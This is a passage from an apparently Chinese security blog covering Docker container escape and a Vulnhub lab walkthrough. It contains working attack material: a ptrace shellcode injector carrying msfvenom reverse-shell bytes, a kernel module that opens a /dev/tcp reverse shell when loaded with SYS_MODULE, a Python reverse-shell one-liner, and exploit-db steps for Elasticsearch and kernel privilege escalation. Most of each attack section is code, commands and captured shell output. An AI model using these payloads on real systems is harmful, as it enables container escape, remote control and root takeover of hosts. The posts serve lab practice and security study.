<p>获取poc：<a href="https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c">https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c</a></p>
<p>生成shellcode(如果不生成，会在靶机上生成一个终端):</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/shell_reverse_tcp <span class="attribute">LHOST</span>=172.16.42.100 <span class="attribute">LPORT</span>=4444 -f c</span><br></pre></td></tr></table></figure>

<p>替换shellcode(==注意长度#define SHELLCODE_SIZE 74，等于shellcode的大小，一定要设置为相应大小的值==）:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Mem Inject</span></span><br><span class="line"><span class="comment">  Copyright (c) 2016 picoFlamingo</span></span><br><span class="line"><span class="comment">This program is free software: you can redistribute it and/or modify</span></span><br><span class="line"><span class="comment">it under the terms of the GNU General Public License as published by</span></span><br><span class="line"><span class="comment">the Free Software Foundation, either version 3 of the License, or</span></span><br><span class="line"><span class="comment">(at your option) any later version.</span></span><br><span class="line"><span class="comment">This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment">but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment">MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="comment">GNU General Public License for more details.</span></span><br><span class="line"><span class="comment">You should have received a copy of the GNU General Public License</span></span><br><span class="line"><span class="comment">along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/reg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHELLCODE_SIZE 74</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *shellcode = </span><br><span class="line"><span class="string">&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\xb9\x02\x00\x11\x5c\xac\x10\x2a\x64\x51\x48\x89\xe6\x6a\x10&quot;</span></span><br><span class="line"><span class="string">&quot;\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f&quot;</span></span><br><span class="line"><span class="string">&quot;\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">inject_data</span> <span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">unsigned</span> <span class="keyword">char</span> *src, <span class="keyword">void</span> *dst, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span>      i;</span><br><span class="line">  <span class="keyword">uint32_t</span> *s = (<span class="keyword">uint32_t</span> *) src;</span><br><span class="line">  <span class="keyword">uint32_t</span> *d = (<span class="keyword">uint32_t</span> *) dst;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i+=<span class="number">4</span>, s++, d++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ((ptrace (PTRACE_POKETEXT, pid, d, *s)) &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  perror (<span class="string">&quot;ptrace(POKETEXT):&quot;</span>);</span><br><span class="line">	  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">pid_t</span>                   target;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">  <span class="keyword">int</span>                     syscall;</span><br><span class="line">  <span class="keyword">long</span>                    dst;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">fprintf</span> (<span class="built_in">stderr</span>, <span class="string">&quot;Usage:\n\t%s pid\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  target = atoi (argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Tracing process %d\n&quot;</span>, target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_ATTACH, target, <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (<span class="string">&quot;ptrace(ATTACH):&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Waiting for process...\n&quot;</span>);</span><br><span class="line">  wait (<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Getting Registers\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_GETREGS, target, <span class="literal">NULL</span>, &amp;regs)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (<span class="string">&quot;ptrace(GETREGS):&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Inject code into current RPI position */</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Injecting shell code at %p\n&quot;</span>, (<span class="keyword">void</span>*)regs.rip);</span><br><span class="line">  inject_data (target, shellcode, (<span class="keyword">void</span>*)regs.rip, SHELLCODE_SIZE);</span><br><span class="line"></span><br><span class="line">  regs.rip += <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Setting instruction pointer to %p\n&quot;</span>, (<span class="keyword">void</span>*)regs.rip);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_SETREGS, target, <span class="literal">NULL</span>, &amp;regs)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (<span class="string">&quot;ptrace(GETREGS):&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Run it!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_DETACH, target, <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  perror (<span class="string">&quot;ptrace(DETACH):&quot;</span>);</span><br><span class="line">	  <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>编译代码:</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">gcc infect.<span class="keyword">c</span> -o infect</span><br></pre></td></tr></table></figure>

<p>移动到容器：</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">docker cp infect test:<span class="regexp">/root/</span></span><br></pre></td></tr></table></figure>

<p>攻击机监听</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvvp <span class="number">4444</span></span><br></pre></td></tr></table></figure>

<p>靶机宿主机启动一个python server进程</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> -m SimpleHTTPServer <span class="number">55555</span></span><br></pre></td></tr></table></figure>

<p>查看python server进程:7365</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  poc docker cp infect <span class="built_in">test</span>:/root/</span><br><span class="line">➜  poc docker <span class="built_in">exec</span> -it <span class="built_in">test</span> /bin/bash</span><br><span class="line">root@f147ae171646:/<span class="comment"># ps -ef | grep 5555</span></span><br><span class="line">root      15260   7462  0 11:44 ?        00:00:00 python3 -m http.server 55555</span><br><span class="line">root      15262  15233  0 11:45 pts/1    00:00:00 grep --color=auto 5555</span><br><span class="line">root@f147ae171646:/<span class="comment"># /root/infect 15260</span></span><br><span class="line">+ Tracing process 15260</span><br><span class="line">+ Waiting <span class="keyword">for</span> process...</span><br><span class="line">+ Getting Registers</span><br><span class="line">+ Injecting shell code at 0x7fdb32ef77e4</span><br><span class="line">+ Setting instruction pointer to 0x7fdb32ef77e6</span><br><span class="line">+ Run it!</span><br><span class="line">root@f147ae171646:/<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p> 结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># nc -lvvp 4444</span></span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br><span class="line">Ncat: Connection from 172.16.42.151.</span><br><span class="line">Ncat: Connection from 172.16.42.151:37440.</span><br><span class="line">ifconfig</span><br><span class="line">ens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.16.42.151  netmask 255.255.255.0  broadcast 172.16.42.255</span><br><span class="line">        inet6 fe80::20c:29ff:fe01:f943  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:01:f9:43  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 206535  bytes 221632693 (211.3 MiB)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="4-6-通过SYS-MODULE逃逸"><a href="#4-6-通过SYS-MODULE逃逸" class="headerlink" title="4.6 通过SYS_MODULE逃逸"></a>4.6 通过SYS_MODULE逃逸</h3><p>exp.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span> <span class="comment">/* Needed by all modules */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span> <span class="comment">/* Needed for KERN_INFO */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span> <span class="comment">/* Needed for the macros */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched/signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/nsproxy.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/proc_ns.h&gt;</span></span></span><br><span class="line"><span class="comment">///&lt; The license type -- this affects runtime behavior</span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"><span class="comment">///&lt; The author -- visible when you use modinfo</span></span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Nimrod Stoler&quot;</span>);</span><br><span class="line"><span class="comment">///&lt; The description -- see modinfo</span></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;NS Escape LKM&quot;</span>);</span><br><span class="line"><span class="comment">///&lt; The version of the module</span></span><br><span class="line">MODULE_VERSION(<span class="string">&quot;0.1&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">escape_start</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rc;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> *envp[] = &#123;</span><br><span class="line">        <span class="string">&quot;SHELL=/bin/bash&quot;</span>,</span><br><span class="line">        <span class="string">&quot;HOME=/home/cyberark&quot;</span>,</span><br><span class="line">        <span class="string">&quot;USER=cyberark&quot;</span>,</span><br><span class="line">        <span class="string">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin&quot;</span>,</span><br><span class="line">        <span class="string">&quot;DISPLAY=:0&quot;</span>,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">char</span> *argv[] = &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/172.16.42.100/4444 0&gt;&amp;1&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    rc = call_usermodehelper(argv[<span class="number">0</span>], argv, envp, UMH_WAIT_PROC);</span><br><span class="line">    printk(<span class="string">&quot;RC is: %i \n&quot;</span>, rc);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">escape_end</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_EMERG <span class="string">&quot;Goodbye!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_init(escape_start);</span><br><span class="line">module_exit(escape_end);</span><br></pre></td></tr></table></figure>

<p>Makefile:</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ifneq</span> (<span class="variable">$(KERNELRELEASE)</span>,)</span><br><span class="line">    obj-m :=exp.o</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    KDIR :=/lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build</span><br><span class="line"><span class="section">all:</span></span><br><span class="line">	make -C <span class="variable">$(KDIR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -f *.ko *.o *.mod.o *.mod.c *.symvers *.order</span><br><span class="line"><span class="keyword">endif</span></span><br></pre></td></tr></table></figure>

<p>编译：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  make</span><br><span class="line">make -C /lib/modules/4.19.0-18-amd64/build M=/root/poc/moudle modules</span><br><span class="line">make[1]: 进入目录“/usr/src/linux-headers-4.19.0-18-amd64”</span><br><span class="line">  CC [M]  /root/poc/moudle/exp.o</span><br><span class="line">  Building modules, stage 2.</span><br><span class="line">  MODPOST 1 modules</span><br><span class="line">  CC      /root/poc/moudle/exp.mod.o</span><br><span class="line">  LD [M]  /root/poc/moudle/exp.ko</span><br><span class="line">make[1]: 离开目录“/usr/src/linux-headers-4.19.0-18-amd64”</span><br></pre></td></tr></table></figure>

<p>编译完成后有如下文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ ls</span><br><span class="line">exp.c  exp.ko  exp.mod.c  exp.mod.o  exp.o  Makefile  modules.order  Module.symvers</span><br></pre></td></tr></table></figure>

<p>在攻击机启动监听</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>

<p>启动sysmodule环境的容器(这里用busybox，因为要用insmod)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --name <span class="built_in">test</span> -itd --cap-add=SYS_MODULE --rm busybox</span><br></pre></td></tr></table></figure>

<p>将exp.ko复制到容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker cp exp.ko <span class="built_in">test</span>:/root/</span><br></pre></td></tr></table></figure>

<p>进入容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it <span class="built_in">test</span> /bin/sh</span><br></pre></td></tr></table></figure>

<p>执行攻击</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">insmod exp.ko</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># nc -lvvp 4444</span></span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br><span class="line">Ncat: Connection from 172.16.42.151.</span><br><span class="line">Ncat: Connection from 172.16.42.151:56732.</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (-1): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@vuln:/<span class="comment">#</span></span><br></pre></td></tr></table></figure>





<h2 id="5-通过内核漏洞进行逃逸"><a href="#5-通过内核漏洞进行逃逸" class="headerlink" title="5. 通过内核漏洞进行逃逸"></a>5. 通过内核漏洞进行逃逸</h2><h3 id="5-1-脏牛提权"><a href="#5-1-脏牛提权" class="headerlink" title="5.1 脏牛提权"></a>5.1 脏牛提权</h3><p>漏洞编号：CVE-2016-5195<br>漏洞名称：脏牛（Dirty COW）<br>漏洞危害：低权限用户利用该漏洞技术可以在全版本Linux系统上实现本地提权<br>影响范围：Linux内核&gt;=2.6.22</p>
<p>该漏洞是 Linux 内核的内存子系统在处理写时拷贝（Copy-on-Write）时存在条件竞争漏洞， 导致可以破坏私有只读内存映射。黑客可以在获取低权限的的本地用户后，利用此漏洞获取 其他只读内存映射的写权限，进一步获取 root 权限。</p>
<p>脏牛提权跟CVE-2018-15664有异曲同工之妙</p>
<p>这里需要重新搭建低版本虚拟机环境就不再复现。</p>
<h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6. 总结"></a>6. 总结</h2><p>本文先讨论了关于容器逃逸相关的一些信息收集手法，然后讨论了挂载敏感目录逃逸的方法，在挂载目录逃逸中又讨论了两种特殊的情况：Docker in Docker和procfs。之后我们我们讨论了利用容器运行时的runC漏洞进行逃逸，再之后我们通过容器的Capabilities权限进行逃逸，其中–privileged参数具有所有的docker Capabilities权限，可以很方便的逃逸，然后分别讨论了在有限Capabilities权限下逃逸的手法，分别对应的特权是：SYS_ADMIN、SYS_PTRACE、SYS_MODULE。最后是内核提权。</p>
<h2 id="7-参考"><a href="#7-参考" class="headerlink" title="7. 参考"></a>7. 参考</h2><ul>
<li><p><a href="https://security.tencent.com/index.php/blog/msg/183">https://security.tencent.com/index.php/blog/msg/183</a></p>
</li>
<li><p>《云原生攻防实践与体系建设》</p>
</li>
<li><p><a href="https://mp.weixin.qq.com/s/WaRECg79Nxx08iekakrlMA">https://mp.weixin.qq.com/s/WaRECg79Nxx08iekakrlMA</a></p>
</li>
<li><p><a href="https://segmentfault.com/a/1190000017543294">https://segmentfault.com/a/1190000017543294</a></p>
</li>
<li><p><a href="https://www.jianshu.com/p/7afb69668280">https://www.jianshu.com/p/7afb69668280</a></p>
</li>
<li><p><a href="https://threezh1.com/2021/02/26/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8Cheat_Sheet/#CVE-2019-5736-runc%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E">https://threezh1.com/2021/02/26/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8Cheat_Sheet/#CVE-2019-5736-runc%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>云原生安全</category>
      </categories>
      <tags>
        <tag>容器安全</tag>
      </tags>
  </entry>
  <entry>
    <title>打靶练习1</title>
    <url>/%E6%89%93%E9%9D%B6%E7%BB%83%E4%B9%A01/</url>
    <content><![CDATA[<blockquote>
<p>天长地久。天地所以能长且久者，以其不自生，故能长生。</p>
</blockquote>
<p>靶机：BoredHackerBlog: Social Network</p>
<span id="more"></span>



<p>靶机地址：<a href="https://www.vulnhub.com/entry/boredhackerblog-social-network,454/">https://www.vulnhub.com/entry/boredhackerblog-social-network,454/</a></p>
<p>建议使用VirtualBox搭建环境</p>
<p><strong>局域网二层扫描</strong></p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo arp-scan -l</span></span><br></pre></td></tr></table></figure>

<ol>
<li><p>判断存活主机</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo</span> ./Ladon <span class="number">192.168.0.101</span>/<span class="number">24</span> IcmpScan</span><br></pre></td></tr></table></figure></li>
<li><p>端口扫描，确定ip</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> <span class="number">192.168.0.104</span></span><br></pre></td></tr></table></figure></li>
<li><p>全端口扫描：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -p- <span class="number">192.168.0.104</span></span><br></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Starting</span> Nmap <span class="number">7</span>.<span class="number">91</span> ( https://nmap.org ) at <span class="number">2021</span>-<span class="number">10</span>-<span class="number">31</span> <span class="number">11</span>:<span class="number">05</span> CST</span><br><span class="line"><span class="attribute">Nmap</span> scan report for <span class="number">192.168.0.104</span></span><br><span class="line"><span class="attribute">Host</span> is up (<span class="number">0</span>.<span class="number">0013</span>s latency).</span><br><span class="line"><span class="attribute">Not</span> shown: <span class="number">65533</span> closed ports</span><br><span class="line"><span class="attribute">PORT</span>     STATE SERVICE</span><br><span class="line"><span class="attribute">22</span>/tcp   open  ssh</span><br><span class="line"><span class="attribute">5000</span>/tcp open  upnp</span><br></pre></td></tr></table></figure>

</li>
<li><p>服务扫描</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -p<span class="number">22</span>,<span class="number">5000</span> -sV <span class="number">192.168.0.104</span></span><br></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">PORT</span>     STATE SERVICE VERSION</span><br><span class="line"><span class="attribute">22</span>/tcp   open  ssh     OpenSSH <span class="number">6</span>.<span class="number">6</span>p<span class="number">1</span> Ubuntu <span class="number">2</span>ubuntu<span class="number">1</span> (Ubuntu Linux; protocol <span class="number">2</span>.<span class="number">0</span>)</span><br><span class="line"><span class="attribute">5000</span>/tcp open  http    Werkzeug httpd <span class="number">0</span>.<span class="number">14</span>.<span class="number">1</span> (Python <span class="number">2</span>.<span class="number">7</span>.<span class="number">15</span>)</span><br><span class="line"><span class="attribute">Service</span> Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure></li>
<li><p>目录扫描</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">ffuf -w ~<span class="regexp">/wordlist/</span>Web-Fuzzing-Box<span class="regexp">/Dir/</span>Directories.txt -u http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">0.104</span>:<span class="number">5000</span>FUZZ -mc all -v -fc <span class="number">404</span></span><br></pre></td></tr></table></figure>

<p><a href="http://192.168.0.104:5000/admin">http://192.168.0.104:5000/admin</a></p>
</li>
<li><p>python反弹shell</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;192.168.0.101&quot;</span>,<span class="number">8081</span>));os.dup<span class="number">2</span>(s.fileno(),<span class="number">0</span>); os.dup<span class="number">2</span>(s.fileno(),<span class="number">1</span>); os.dup<span class="number">2</span>(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br></pre></td></tr></table></figure></li>
<li><p>容器识别：</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ls</span> <span class="string">/.dockerenv</span></span><br><span class="line">或者</span><br><span class="line">cat <span class="string">/proc/1/cgroup</span></span><br></pre></td></tr></table></figure></li>
<li><p>存活ip扫描</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">for</span> i in $(seq <span class="number">1</span> <span class="number">10</span>); do ping -c <span class="number">1</span> <span class="number">172</span>.<span class="number">17</span>.<span class="number">0</span>.$i; done</span><br></pre></td></tr></table></figure></li>
<li><p>代理建立</p>
<img src="../images/pic/daba1.png" alt="image-20211031121233836" style="zoom:50%;" /> </li>
<li><p>代理扫描</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">proxychains4</span> nmap -Pn -sT <span class="number">172.17.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">proxychains4</span> nmap -Pn -sT <span class="number">172.17.0.2</span></span><br><span class="line"><span class="attribute">proxychains4</span> nmap -p<span class="number">9200</span> -Pn -sT -sV <span class="number">172.17.0.2</span></span><br></pre></td></tr></table></figure></li>
<li><p>搜索Elasticsearch Exp</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">searchsploit Elasticsearch</span></span><br></pre></td></tr></table></figure></li>
<li><p>复制payload</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cp <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/linux/</span>remote<span class="regexp">/36337.py ./</span></span><br></pre></td></tr></table></figure></li>
<li><p>漏洞利用CVE-2015-1427</p>
</li>
<li><p>登录，尝试sudo权限：sudo -s</p>
</li>
<li><p>搜索内核漏洞</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">searchsploit</span> linux <span class="number">3</span>.<span class="number">13</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">CVE</span>-<span class="number">2015</span>-<span class="number">1328</span></span><br></pre></td></tr></table></figure></li>
<li><p>复制exp</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cp <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/linux/</span>local<span class="regexp">/37292.c ./</span></span><br></pre></td></tr></table></figure></li>
<li><p>修改exp</p>
<img src="../images/pic/daba2.png" alt="image-20211031202653110" style="zoom:50%;" /> </li>
<li><p>搜索依赖so文件</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">locate ofs-<span class="keyword">lib</span>.so</span><br></pre></td></tr></table></figure></li>
<li><p>靶机下载so文件和exp</p>
</li>
<li><p>移动到tmp目录</p>
</li>
<li><p>执行exp</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">chmod</span> +<span class="keyword">x</span> <span class="keyword">exp</span></span><br><span class="line">./<span class="keyword">exp</span></span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>红队技术</category>
      </categories>
      <tags>
        <tag>打靶</tag>
      </tags>
  </entry>
  <entry>
    <title>使用ebpf保障容器云运行时安全</title>
    <url>/%E4%BD%BF%E7%94%A8eBPF%E4%BF%9D%E9%9A%9C%E5%AE%B9%E5%99%A8%E4%BA%91%E8%BF%90%E8%A1%8C%E6%97%B6%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<blockquote>
<p>人法地，地法天，天法道，道法自然。</p>
</blockquote>
<span id="more"></span>

<p>Linux一直没有好用的内核态的动态追踪工具，直到EBPF的出现。EBPF可以动态追踪linux事件，获取运行信息。通过分析这些信息可以用来确定是否存在攻击行为。</p>
